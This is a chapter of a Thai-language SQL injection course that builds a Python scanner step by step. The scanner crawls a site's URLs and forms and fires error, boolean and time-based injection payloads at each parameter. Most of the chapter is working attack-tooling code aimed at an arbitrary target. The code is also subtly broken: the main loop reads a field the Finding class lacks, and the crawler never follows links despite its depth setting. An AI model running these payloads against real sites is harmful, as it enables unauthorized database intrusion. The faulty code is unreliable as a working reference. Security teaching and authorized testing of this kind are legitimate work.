# Part 076: Building a SQL Injection Scanner

## ภาพรวม

สร้าง SQLi scanner เป็นของตัวเอง step by step

**ขั้นตอนที่ 1211-1225**

---

## 1211. Scanner Architecture

```python
# SQLi Scanner สถาปัตยกรรม

"""
SQLiScanner:
  Crawler      - ค้นหา URLs และ parameters
  Detector     - ตรวจสอบ SQL injection
  Extractor    - ดึงข้อมูลหากพบช่องโหว่
  Reporter     - สร้างรายงาน
"""

from dataclasses import dataclass
from typing import Optional, List

@dataclass
class ScanTarget:
    url: str
    method: str  # GET, POST
    param: str
    param_type: str  # query, body, header, cookie

@dataclass
class Finding:
    target: ScanTarget
    sqli_type: str  # error, union, boolean, time
    payload: str
    evidence: str
    severity: str  # critical, high, medium
```

---

## 1212. Crawler Component

```python
from urllib.parse import urljoin, urlparse, parse_qs
from html.parser import HTMLParser
import requests

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self._current_form = None
    
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == 'form':
            self._current_form = {
                'action': attrs.get('action', ''),
                'method': attrs.get('method', 'get').upper(),
                'inputs': []
            }
        elif tag == 'input' and self._current_form:
            name = attrs.get('name', '')
            itype = attrs.get('type', 'text')
            if name and itype not in ('submit', 'button', 'image', 'reset'):
                self._current_form['inputs'].append(name)
    
    def handle_endtag(self, tag):
        if tag == 'form' and self._current_form:
            self.forms.append(self._current_form)
            self._current_form = None

class Crawler:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.visited = set()
        self.targets: List[ScanTarget] = []
    
    def crawl(self, url: str, depth: int = 2):
        if depth == 0 or url in self.visited:
            return
        self.visited.add(url)
        
        try:
            r = requests.get(url, timeout=5)
        except Exception:
            return
        
        # ค้นหา GET params จาก URL
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        for param in qs:
            self.targets.append(ScanTarget(url, 'GET', param, 'query'))
        
        # ค้นหา forms
        parser = FormParser()
        parser.feed(r.text)
        for form in parser.forms:
            action = urljoin(url, form['action'])
            for inp in form['inputs']:
                self.targets.append(ScanTarget(action, form['method'], inp, 'body'))
```

---

## 1213. Detector Component

```python
import time

ERROR_SIGS = [
    'you have an error in your sql syntax',
    'warning: mysql_',
    'unclosed quotation mark',
    'pg_query():',
    'ora-0',
    'sqlite3::query',
]

class SQLiDetector:
    PAYLOADS = {
        'error': ["'", "'';", "' OR 1=1#"],
        'boolean': ["' AND 1=1-- -", "' AND 1=2-- -"],
        'time': ["' AND SLEEP(2)-- -", "'; WAITFOR DELAY '0:0:2'-- -"],
    }
    
    def detect(self, target: ScanTarget) -> Optional[Finding]:
        baseline = self._baseline(target)
        
        # Error-based
        for payload in self.PAYLOADS['error']:
            r = self._send(target, payload)
            for sig in ERROR_SIGS:
                if sig in r.text.lower():
                    return Finding(target, 'error', payload, sig, 'high')
        
        # Boolean-based
        r_true = self._send(target, self.PAYLOADS['boolean'][0])
        r_false = self._send(target, self.PAYLOADS['boolean'][1])
        if r_true and r_false:
            if abs(len(r_true.text) - len(r_false.text)) > 50:
                return Finding(target, 'boolean', self.PAYLOADS['boolean'][0],
                               f'Length diff: {len(r_true.text)} vs {len(r_false.text)}', 'high')
        
        # Time-based
        for payload in self.PAYLOADS['time']:
            start = time.time()
            self._send(target, payload)
            if time.time() - start > 1.8:
                return Finding(target, 'time', payload, 'Time delay detected', 'high')
        
        return None
    
    def _baseline(self, target: ScanTarget):
        return self._send(target, 'test123')
    
    def _send(self, target: ScanTarget, value: str):
        try:
            if target.method == 'GET':
                return requests.get(target.url, params={target.param: value}, timeout=5)
            else:
                return requests.post(target.url, data={target.param: value}, timeout=5)
        except Exception:
            return None
```

---

## 1214. Reporter Component

```python
import json
from datetime import datetime

class Reporter:
    def __init__(self):
        self.findings: List[Finding] = []
    
    def add(self, finding: Finding):
        self.findings.append(finding)
    
    def to_json(self, output_path: str):
        report = {
            'generated': datetime.now().isoformat(),
            'total': len(self.findings),
            'findings': [
                {
                    'url': f.target.url,
                    'parameter': f.target.param,
                    'method': f.target.method,
                    'type': f.sqli_type,
                    'payload': f.payload,
                    'evidence': f.evidence,
                    'severity': f.severity,
                }
                for f in self.findings
            ]
        }
        with open(output_path, 'w') as fp:
            json.dump(report, fp, indent=2)
        print(f"Report saved: {output_path}")
    
    def summary(self):
        print(f"\n{'='*50}")
        print(f"SCAN SUMMARY: {len(self.findings)} findings")
        for f in self.findings:
            print(f"  [{f.severity.upper()}] {f.target.method} {f.target.url}")
            print(f"    Param: {f.target.param} | Type: {f.sqli_type}")
            print(f"    Payload: {f.payload[:60]}")
```

---

## 1215. Main Scanner

```python
import sys

class SQLiScanner:
    def __init__(self, target_url: str):
        self.crawler = Crawler(target_url)
        self.detector = SQLiDetector()
        self.reporter = Reporter()
    
    def scan(self, depth: int = 2):
        print(f"[*] Crawling {self.crawler.base_url}...")
        self.crawler.crawl(self.crawler.base_url, depth)
        print(f"[*] Found {len(self.crawler.targets)} targets")
        
        for i, target in enumerate(self.crawler.targets, 1):
            print(f"[{i}/{len(self.crawler.targets)}] Testing {target.url} [{target.param}]")
            finding = self.detector.detect(target)
            if finding:
                print(f"  [!] FOUND: {finding.sqli_type} via {finding.param}")
                self.reporter.add(finding)
        
        self.reporter.summary()
        self.reporter.to_json('sqli_report.json')

# Usage:
# scanner = SQLiScanner('http://target.com')
# scanner.scan(depth=2)
```

---

## สรุป

SQLi Scanner:
- **Crawler** - ค้นหา URLs, forms, parameters
- **Detector** - error/boolean/time-based detection
- **Reporter** - JSON output, summary
- **Full scanner** - scan(depth=N)

---

*Part 076 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
